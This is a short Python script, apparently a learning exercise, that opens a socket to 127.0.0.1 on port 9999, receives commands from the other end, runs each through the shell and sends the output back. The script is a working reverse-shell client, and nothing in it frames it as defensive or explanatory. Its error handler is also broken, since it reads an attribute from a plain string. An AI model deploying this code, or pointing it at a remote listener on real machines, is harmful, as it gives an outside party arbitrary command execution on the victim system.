import subprocess
import socket
def run_command(command):
    command = command.rstrip()
    try:
        child = subprocess.run(command ,shell=True ,stdout=subprocess.PIPE,text=True)
    except:
        child = 'can not execute the command'
    return child.stdout
client = socket.socket()
client.connect(("127.0.0.1",9999))
while True:
    date = client.recv(1024)
    print(date.decode())
    output = run_command(date.decode())
    client.sendall(output.encode())
client.close()